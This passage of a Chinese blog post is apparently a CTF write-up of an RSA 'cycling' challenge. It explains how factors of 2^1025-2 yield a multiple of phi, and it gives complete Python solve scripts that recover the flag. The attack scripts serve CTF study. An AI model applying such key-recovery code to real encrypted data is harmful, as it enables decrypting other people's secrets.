class="number">193</span>, <span class="number">241</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">673</span>, <span class="number">769</span>, <span class="number">65537</span>, <span class="number">274177</span>,</span><br><span class="line">        <span class="number">6700417</span>, <span class="number">22253377</span>, <span class="number">67280421310721</span>, <span class="number">18446744069414584321</span>,</span><br><span class="line">        <span class="number">442499826945303593556473164314770689</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">448</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">29</span>, <span class="number">43</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">257</span>, <span class="number">449</span>, <span class="number">641</span>, <span class="number">2689</span>, <span class="number">5153</span>, <span class="number">65537</span>, <span class="number">6700417</span>,</span><br><span class="line">        <span class="number">15790321</span>, <span class="number">183076097</span>, <span class="number">54410972897</span>, <span class="number">358429848460993</span>,</span><br><span class="line">        <span class="number">167773885276849215533569</span>, <span class="number">37414057161322375957408148834323969</span>],</span><br><span class="line">    <span class="number">512</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">65537</span>, <span class="number">274177</span>, <span class="number">6700417</span>, <span class="number">67280421310721</span>,</span><br><span class="line">        <span class="number">1238926361552897</span>, <span class="number">59649589127497217</span>, <span class="number">5704689200685129054721</span>,</span><br><span class="line">        <span class="number">93461639715357977769163558199606896584051237541638188580280321</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">768</span>: [</span><br><span class="line">        <span class="comment"># factors of 2**384 - 1</span></span><br><span class="line">        <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">193</span>, <span class="number">241</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">673</span>, <span class="number">769</span>, <span class="number">65537</span>, <span class="number">274177</span>,</span><br><span class="line">        <span class="number">6700417</span>, <span class="number">22253377</span>, <span class="number">67280421310721</span>, <span class="number">18446744069414584321</span>,</span><br><span class="line">        <span class="number">442499826945303593556473164314770689</span>,</span><br><span class="line">        <span class="comment"># factors of 2**128 + 1</span></span><br><span class="line">        <span class="number">59649589127497217</span>, <span class="number">5704689200685129054721</span>,</span><br><span class="line">        <span class="comment"># factors of 2**256 - 2**128 + 1</span></span><br><span class="line">        <span class="number">349621839326921795694385454593</span>,</span><br><span class="line">        <span class="number">331192380488114152600457428497953408512758882817</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">1024</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">65537</span>, <span class="number">274177</span>, <span class="number">6700417</span>, <span class="number">67280421310721</span>,</span><br><span class="line">        <span class="number">1238926361552897</span>, <span class="number">59649589127497217</span>, <span class="number">5704689200685129054721</span>,</span><br><span class="line">        <span class="number">93461639715357977769163558199606896584051237541638188580280321</span>, <span class="number">2424833</span>,</span><br><span class="line">        <span class="number">7455602825647884208337395736200454918783366342657</span>,</span><br><span class="line">        <span class="number">741640062627530801524787141901937474059940781097519023905821316144415759504705008092818711693940737</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">2048</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">65537</span>, <span class="number">274177</span>, <span class="number">6700417</span>, <span class="number">67280421310721</span>,</span><br><span class="line">        <span class="number">1238926361552897</span>, <span class="number">59649589127497217</span>, <span class="number">5704689200685129054721</span>,</span><br><span class="line">        <span class="number">93461639715357977769163558199606896584051237541638188580280321</span>, <span class="number">2424833</span>,</span><br><span class="line">        <span class="number">7455602825647884208337395736200454918783366342657</span>, <span class="number">45592577</span>, <span class="number">6487031809</span>,</span><br><span class="line">        <span class="number">4659775785220018543264560743076778192897</span>,</span><br><span class="line">        <span class="number">741640062627530801524787141901937474059940781097519023905821316144415759504705008092818711693940737</span>,</span><br><span class="line">        <span class="number">130439874405488189727484768796509903946608530841611892186895295776832416251471863574140227977573104895898783928842923844831149032913798729088601617946094119449010595906710130531906171018354491609619193912488538116080712299672322806217820753127014424577</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prod</span>(<span class="params">f: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;计算累积结果&quot;&quot;&quot;</span></span><br><span class="line">  res = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> p <span class="keyword">in</span> f:</span><br><span class="line">    res *= p</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divisors_from_factors</span>(<span class="params">factors: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算给定因子的整数的除数列表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; divisors_from_factors([2,5])</span></span><br><span class="line"><span class="string">    [1, 2, 5, 10]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    res = &#123;<span class="number">1</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> factors:</span><br><span class="line">      res |= <span class="built_in">set</span>(x * f <span class="keyword">for</span> x <span class="keyword">in</span> res)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CycleLength</span>:</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Computes properties of RSA keys with a known cycle length.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  An instance of this class gives properties of RSA moduli n with</span></span><br><span class="line"><span class="string">  the property that lambda(lambda(n)) divides max_cycle.</span></span><br><span class="line"><span class="string">  The computation of these properties requires to know the factorization</span></span><br><span class="line"><span class="string">  of max_cycle. Hence we use values for max_cycle for which the factorization</span></span><br><span class="line"><span class="string">  is known. For example one can use max_cycle = 2 * (2^m - 1) and just</span></span><br><span class="line"><span class="string">  look up the factorization of the Mersenne number 2^m - 1.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  This is code that is both used for generating challenges and for solving them.</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, max_cycle_factors: <span class="built_in">list</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Defines the length of the cycle. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">      max_cycle_factors: a list of prime factors of the maximal cycle</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    self.max_cycle_factors: <span class="built_in">list</span>[<span class="built_in">int</span>] = max_cycle_factors</span><br><span class="line">    self.max_cycle = prod(max_cycle_factors)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># A list of possible divisors of max_cycle</span></span><br><span class="line">    self.max_cycle_divisors = divisors_from_factors(max_cycle_factors)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># A list of primes with the property that r - 1 divides max_cycle.</span></span><br><span class="line">    self.primes_ = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">primes</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a list of primes r, such that r-1 divides self.max_cycle.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.primes_ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">      self.primes_ = [d + <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> self.max_cycle_divisors</span><br><span class="line">                      <span class="keyword">if</span> sympy.isprime(d + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> self.primes_</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">n: <span class="built_in">int</span>, cycle_length: CycleLength, m0: <span class="built_in">int</span> = <span class="number">3</span>, max_attempts: <span class="built_in">int</span> = <span class="number">10</span></span>):</span></span><br><span class="line">  <span class="built_in">print</span>(m0, max_attempts)  <span class="comment"># 3 10</span></span><br><span class="line">  <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(m0, m0 + max_attempts):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> cycle_length.primes():</span><br><span class="line">      m = <span class="built_in">pow</span>(m, p, n)</span><br><span class="line">      g = gcd(m - <span class="number">1</span>, n)</span><br><span class="line">      <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">        <span class="keyword">return</span> g, n//g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_challenge</span>(<span class="params">n, cycle_length</span>):</span></span><br><span class="line">  res = solve(n, cycle_length)</span><br><span class="line">  <span class="keyword">if</span> res:</span><br><span class="line">    p, q = res</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; p &lt; n <span class="keyword">and</span> <span class="number">1</span> &lt; q &lt; n <span class="keyword">and</span> p*q == n:</span><br><span class="line">      <span class="keyword">return</span> p, q </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1</span></span><br><span class="line">ct = <span class="number">0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">1024</span>  <span class="comment"># 2^1025 - 3 是1025比特位的数</span></span><br><span class="line">cycle_length = CycleLength([<span class="number">2</span>] + MERSENNE_PRIME_FACTORS[m])  <span class="comment"># 所以补一个2</span></span><br><span class="line">p, q = solve_challenge(n, cycle_length)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">pt = <span class="built_in">int</span>(<span class="built_in">pow</span>(ct, d, n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(pt))</span><br><span class="line"><span class="comment"># b&#x27;CTF&#123;Recycling_Is_Great&#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><p>xchgeaxeax师傅分享了他找到的wp，膜拜了下来自日本的<a href="https://zenn.dev/kurenaif/articles/ae83691511b966">密码魔女wp</a></p><p>不得不说，技术力拉满，但魔女🧙‍♀️表达能力太差了。</p><p>也或许是日语机翻的问题，看起来实在太差劲了，一题看一天…</p><p><strong>来分析一下题目吧！</strong></p><blockquote><p>It is well known that any RSA encryption can be undone by just encrypting the ciphertext over and over again. </p></blockquote><p>根据题意，“任何RSA加密都能被循环加密所解密”</p><p>其后，给了个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x112b00148621</span></span><br><span class="line">pt = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="comment"># Encryption</span></span><br><span class="line">ct = <span class="built_in">pow</span>(pt, e, n)</span><br></pre></td></tr></table></figure><p>以上为对明文为deedbeef加密的过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decryption via cycling:</span></span><br><span class="line">pt = ct</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">209</span>):</span><br><span class="line">pt = <span class="built_in">pow</span>(pt, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(pt)).replace(<span class="string">r&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment"># deadbeef</span></span><br></pre></td></tr></table></figure><p>可见，直接对密文加密209次就能得到明文</p><p>而根据这个性质，可以人为选好e、n控制好循环次数，达到<strong>定时公布消息</strong>的功能</p><p>之后，给了flag相关的e、n、ct，以及循环次数$2^{1025}-3$</p><p>循环次数过于大了，普通机子直接跑48h时间应该是不够的</p><p><strong>需要更好的算法求解问题</strong></p><p>聚焦循环加密的解密过程，有以下：</p><p>$m≡c^{e^{2^{1025}-3}}≡(m^e)^{e^{2^{1025}-3}}≡m^{e^{2^{1025}-2}} \mod n$</p><p>可得：</p><p>1⃣️$d≡e^{2^{1025}-3}$</p><p>2⃣️$ed≡e^{2^{1025}-2}≡1 \mod phi$</p><p>对1⃣️，因为d太大了，算不出来，就算我们有了私钥d也不能解出明文，若想着硬算出d同直接循环求解没本质区别</p><p>对2⃣️，由欧拉定理，可得：$\phi(phi) = 2^{1025-2}$，记为3⃣️</p><blockquote><p>接下来的手法，我只能从解释的角度出发了，至于当时让我想，应该是想不出来的。</p></blockquote><blockquote><p>看到官方exp里，有专门的名字，或许是常用攻击方法？还得学习</p></blockquote><p>为解决此题，我们需要找到一个相对够小的d，至少我们能算出来</p><p>如何减小d的大小又不影响解密呢？</p><p>答案是：$d \mod phi$</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/IMG_BB25E5BF9D40-1.jpeg" alt="dmphi"></p><p>其实，这是走不通的，因为我们不知道phi是多少，这样反而让未知量越来越多了</p><p>但，也不是没有收获，针对phi不知的问题，可以利用3⃣️，有：</p><p>$\phi(phi) = 2^{1025}-2$</p><p>拆之，得：</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220706184618463.png" alt="phi(phi)"></p><p>而设$n=p*q$,则设：$phi=(p-1)•(q-1)=A•B•C•D•E•F•…$</p><p>又：$\phi(phi) = 2^{1025}-2=(A-1)•(B-1)•(C-1)•(D-1)•(E-1)•(F-1)•…$</p><p>$=a•b•c•d•e•f•g•h•…$</p><p>也就是说，$A-1$可能被拆成了$a•b$, $B-1$可能被拆成了$c•e•h$</p><p>所以，排列组合并相乘$\phi(phi)$的素因子，再+1，我们能得到含有phi的式子</p><p>$(a•b+1)(a•c+1)(a•d+1)···(a•b•c+1)···(c•e•h+1)···$</p><p>就会得到$K•A•B•C•D•E•F…=K*phi$</p><p>总之，利用$\phi(phi)$的素因子，我们能恢复出$K*phi$</p><p>实现代码，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">lambda_lambda_divs = [</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">3</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">17</span>,</span><br><span class="line"> <span class="number">257</span>,</span><br><span class="line"> <span class="number">641</span>,</span><br><span class="line"> <span class="number">65537</span>,</span><br><span class="line"> <span class="number">274177</span>,</span><br><span class="line"> <span class="number">2424833</span>,</span><br><span class="line"> <span class="number">6700417</span>,</span><br><span class="line"> <span class="number">67280421310721</span>,</span><br><span class="line"> <span class="number">1238926361552897</span>,</span><br><span class="line"> <span class="number">59649589127497217</span>,</span><br><span class="line"> <span class="number">5704689200685129054721</span>,</span><br><span class="line"> <span class="number">7455602825647884208337395736200454918783366342657</span>,</span><br><span class="line"> <span class="number">93461639715357977769163558199606896584051237541638188580280321</span>,</span><br><span class="line"> <span class="number">741640062627530801524787141901937474059940781097519023905821316144415759504705008092818711693940737</span></span><br><span class="line"> ]</span><br><span class="line"></span><br><span class="line">lambda_lambda = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> lambda_lambda_divs:</span><br><span class="line">    lambda_lambda *= d</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> lambda_lambda == <span class="number">2</span>**<span class="number">1025</span>-<span class="number">2</span></span><br><span class="line"></span><br><span class="line">lambda_candidate = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> lambda_lambda_divs:</span><br><span class="line">    lambda_candidate *= (d+<span class="number">1</span>)**<span class="number">10</span></span><br><span class="line"></span><br><span class="line">cand = lambda_lambda_divs[:<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">res = <span class="number">1</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> L <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lambda_lambda_divs) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> itertools.combinations(lambda_lambda_divs, L):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;cnt&#125;</span>&quot;</span>)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        a = <span class="number">2</span>*math.prod(subset)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(a):</span><br><span class="line">            res *= a</span><br></pre></td></tr></table></figure><p>再回到<strong>如何减小d的大小又不影响解密</strong>这个问题，不难发现：</p><p><strong>可用$d \mod K*phi$</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/IMG_2A80F05B3E7B-1.jpeg" alt="dmkphi"></p><p>也即：可利用较小的$d \mod K*phi$（原来d为$e^{2^{1025}-3}$）来当私钥d，解密出明文m</p><p><strong>（前面算得的K*phi记为res）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="built_in">pow</span>(e,<span class="number">2</span>**<span class="number">1025</span>-<span class="number">3</span>,res)  <span class="comment"># d mod K*phi</span></span><br><span class="line">pt = <span class="built_in">pow</span>(ct, p, n)</span><br><span class="line"><span class="built_in">print</span>(pt.to_bytes((pt.bit_length() + <span class="number">7</span>)//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>).decode())</span><br></pre></td></tr></table></figure><p>看到这<code>p = pow(e,2**1025-3,res)</code>，会发现这计算量也不小，能不能优化呢？</p><p>$e^{2^{1025}-3}≡e^{2^{1025}-2}•e^{-1}≡e^{-1} \mod K•phi$</p><p>（哪位师傅来教一下我，为什么可以）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">p</span> = <span class="built_in">pow</span>(<span class="keyword">e</span>,-<span class="number">1</span>,<span class="keyword">res</span>)  # d <span class="keyword">mod</span> K*phi</span><br><span class="line"><span class="keyword">pt</span> = <span class="built_in">pow</span>(ct, <span class="keyword">p</span>, n)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">pt</span>.to_bytes((<span class="keyword">pt</span>.bit_length() + <span class="number">7</span>)//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>).decode())</span><br></pre></td></tr></table></figure><h4 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1</span></span><br><span class="line">ct = <span class="number">0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680</span></span><br><span class="line"></span><br><span class="line">lambda_lambda_divs = [</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">3</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">17</span>,</span><br><span class="line"> <span class="number">257</span>,</span><br><span class="line"> <span class="number">641</span>,</span><br><span class="line"> <span class="number">65537</span>,</span><br><span class="line"> <span class="number">274177</span>,</span><br><span class="line"> <span class="number">2424833</span>,</span><br><span class="line"> <span class="number">6700417</span>,</span><br><span class="line"> <span class="number">67280421310721</span>,</span><br><span class="line"> <span class="number">1238926361552897</span>,</span><br><span class="line"> <span class="number">59649589127497217</span>,</span><br><span class="line"> <span class="number">5704689200685129054721</span>,</span><br><span class="line"> <span class="number">7455602825647884208337395736200454918783366342657</span>,</span><br><span class="line"> <span class="number">93461639715357977769163558199606896584051237541638188580280321</span>,</span><br><span class="line"> <span class="number">741640062627530801524787141901937474059940781097519023905821316144415759504705008092818711693940737</span></span><br><span class="line"> ]</span><br><span class="line"></span><br><span class="line">lambda_lambda = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> lambda_lambda_divs:</span><br><span class="line">    lambda_lambda *= d</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> lambda_lambda == <span class="number">2</span>**<span class="number">1025</span>-<span class="number">2</span></span><br><span class="line"></span><br><span class="line">lambda_candidate = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> lambda_lambda_divs:</span><br><span class="line">    lambda_candidate *= (d+<span class="number">1</span>)**<span class="number">10</span></span><br><span class="line"></span><br><span class="line">cand = lambda_lambda_divs[:<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">res = <span class="number">1</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> L <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lambda_lambda_divs) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> itertools.combinations(lambda_lambda_divs, L):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;cnt&#125;</span>&quot;</span>)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        a = <span class="number">2</span>*math.prod(subset)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(a):</span><br><span class="line">            res *= a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">pow</span>(e,-<span class="number">1</span>,res)</span><br><span class="line">pt = <span class="built_in">pow</span>(ct, p, n)</span><br><span class="line"><span class="built_in">print</span>(pt.to_bytes((pt.bit_length() + <span class="number">7</span>)//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>).decode())</span><br><span class="line"><span class="comment"># CTF&#123;Recycling_Is_Great&#125;</span></span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><p>Cycle attack on RSA</p><p>循环攻击给了确定次数，即可攻破</p></li><li><p>通过$\phi(phi)$获得$K*phi$</p></li><li><p>d可以放缩成$d \mod K*phi$</p></li></ul><h2 id="MAYBE-SOMEDAY"><a href="#MAYBE-SOMEDAY" class="headerlink" title="MAYBE SOMEDAY"></a>MAYBE SOMEDAY</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><blockquote><p>Leave me your ciphertexts. I will talk to you later.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 